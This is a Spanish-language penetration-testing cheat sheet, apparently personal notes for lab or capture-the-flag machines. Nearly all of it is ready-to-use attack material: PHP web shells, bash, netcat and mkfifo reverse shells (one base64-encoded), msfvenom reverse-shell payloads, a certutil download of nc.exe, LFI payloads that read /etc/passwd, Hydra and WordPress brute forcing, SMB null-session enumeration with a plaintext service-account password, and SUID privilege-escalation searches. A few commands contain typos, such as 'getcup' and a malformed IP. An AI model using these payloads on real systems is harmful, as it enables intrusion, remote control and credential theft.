# Chuleta para pentesting

## Compartir con host

```bash
sudo /usr/bin/vmhgfs-fuse .host:/ /home/kali/compartida -o subtype=vmhgfs-fuse,allow_other

```

## PHP

```php
 <?php system($_REQUEST['cmd']); ?>

 <?php
	if(isset($_REQUEST['cmd'])){
	    echo "<pre>";
	    $cmd = ($_REQUEST['cmd']);
	    system($cmd);
	    echo "</pre>";
	    die;
	}
?>
```

## Reverse Shells

### En Linux:
```bash
bash -c "bash -i >& /dev/tcp/192.168.168.130/443 0>&1"

# Por http
bash -c "bash -i >%26 /dev/tcp/192.168.168.130/443 0>%261"

#Por base64
#Preparacion en atacante
echo "bash -c 'bash -i >%26 /dev/tcp/192.168.168.130/443 0>%261'" | base64
#Comando victima:
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44Ljc2LjExMi80NDMgMD4mMQo=" | base64 -d | bash

#Con nc
nc -e /bin/sh 92.168.168.130 443

# Con nc sin p치rametro -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.168.130 443 >/tmp/f

# Con php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.168.130 443 >/tmp/f'); ?>

```

### En Windows:

```bash
#Con nc
cmd.exe /c "C:\users\joe\documents\nc.exe -e cmd.exe 192.168.11.160 4444"
```
## Fuzzing

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://192.168.11.133/FUZZ 



```
## Tratamiento de la TTY

Previamenta al tratamiento hemos de asegirarnos que estamos en una **bash**. Antes de ponernos a la escucha con nc:

```console
echo $SHELL
# Si el resultado no es /bin/bash hay que lanzar bash
bash 
# Luego lanzar
nc -nlvp 4444
```

```bash
# En victima:
script /dev/null -c bash
# En python:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# CTRL_Z para pasar a segundo plano
# En atacante
stty raw -echo; fg
# En victima
reset xterm
export SHELL=/bin/bash
export TERM=xterm
# Previamente en atacante stty size para ver las dimensiones
stty rows 59 columns 227
```

## LFI

```bash
# Escapando caracteres
%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd%00

# Filtro en BASE64
php://filter/convert.iconv.utf-8.utf-16/resource=test.php
```

## Fuerza bruta
```bash
#Hydra
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.29.199


```
## SMB

```bash
# Listar recursos con sesi칩n nula
smbclient -N -L //10.10.66.180/
# Tambien
smbclient -L 10.10.10.3 -N --option="client min protocol=NT1"

# Con smbmap y sesion nula
smbmap -H 10.10.10.1000
smbmap -H 10.10.10.237 -u 'null'
#Para conectar ver lo que tiene un recurso, paramero -r:
smbmap -H 10.10.10.1000 -r Replication
#Para descargarnos algo, par치metro --download
smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
#Con credenciales:
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Groups

#SMBGET: Para descargar un directorio entero:
smbget -R smb://active.htb/Replication -U ""

# Ver unidades montadas
showmount -e 10.10.10.180

# Montar unidad
mount -t nfs 10.10.10.180:/site_backups /mnt/nfs
```
## CMS

### Wordpress

```bash
#Inicial
wpscan --url http://10.10.103.70

# Enumerar usuarios
wpscan --url http://10.10.103.70 -e u

# Buscar plugins vulnerables
wpscan --url http://10.10.103.70 -e vp

# Fuerza bruta
wpscan --url https://10.10.103.70/wp-login.php -U Elliot -P fsocity_sorted.dic 
```

## MSFVENOM

```bash
# aplicaci칩n war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.11.160 LPORT=443 -f war > reverse.war

# Para BufferOverflow
msfvenom -p windows/shell_reverse_tcp LHOST=172.16.196.198 LPORT=443 --platform windows -a x86 -b "\x00" -f c

# Como ejecutable para Windows
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.51 LPORT=443 -f exe -o reverse.exe
```

## Traspaso de archivos

## En linux

```bash
# Abriendo un servidor http
sudo python3 -m http.server 80

# Compartiendo un recurso SMB
```

## En windows

```cmd
certutil.exe -f -urlcache -split http://192.168.11.160/nc.exe c:\\windows\temp\nc.exe
```
## Escalada

### Permisos SUID

```bash
find \-perm -4000 2>/dev/null

find / -perm -4000 2>/dev/null | xargs ls -lah

find / -perm -u=s -type f 2>/dev/null
```
### Capabilities

```bash
getcup -r / 2>/dev/null

```

## Otros

Trazas icmp
```bash
sudo tcpdump -i tun0 icmp -n
```